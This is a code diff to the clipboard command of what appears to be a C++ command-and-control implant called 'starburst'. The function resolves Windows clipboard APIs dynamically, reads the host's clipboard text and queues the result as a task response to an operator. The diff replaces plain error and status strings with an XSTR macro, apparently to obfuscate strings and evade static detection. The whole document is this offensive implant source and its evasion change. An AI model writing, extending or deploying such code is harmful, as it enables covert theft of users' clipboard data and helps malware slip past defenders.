@@ -31,7 +31,7 @@ auto declfn starburst::cmd_clipboard(
     auto h_user32 = inst.kernel32.LoadLibraryA( _n );
     if ( !h_user32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to load user32.dll" ) ) );
+            XSTR( "failed to load user32.dll" ) );
         return;
     }
 
@@ -53,20 +53,20 @@ auto declfn starburst::cmd_clipboard(
     if ( !pOpenClipboard || !pCloseClipboard || !pGetClipboardData ||
          !pIsClipboardFormatAvailable || !pGlobalLock || !pGlobalUnlock ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
+            XSTR( "API resolution failed" ) );
         return;
     }
 
     if ( !pOpenClipboard( nullptr ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "OpenClipboard failed" ) ) );
+            XSTR( "OpenClipboard failed" ) );
         return;
     }
 
     if ( !pIsClipboardFormatAvailable( CF_UNICODETEXT_VAL ) ) {
         pCloseClipboard();
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "No text data" ) ) );
+            XSTR( "No text data" ) );
         return;
     }
 
@@ -74,7 +74,7 @@ auto declfn starburst::cmd_clipboard(
     if ( !h_data ) {
         pCloseClipboard();
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "Clipboard empty" ) ) );
+            XSTR( "Clipboard empty" ) );
         return;
     }
 
@@ -82,7 +82,7 @@ auto declfn starburst::cmd_clipboard(
     if ( !w_text ) {
         pCloseClipboard();
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GlobalLock failed" ) ) );
+            XSTR( "GlobalLock failed" ) );
         return;
     }
 
@@ -92,7 +92,7 @@ auto declfn starburst::cmd_clipboard(
         pGlobalUnlock( h_data );
         pCloseClipboard();
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "Clipboard empty" ) ) );
+            XSTR( "Clipboard empty" ) );
         return;
     }
 
@@ -101,7 +101,7 @@ auto declfn starburst::cmd_clipboard(
         pGlobalUnlock( h_data );
         pCloseClipboard();
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
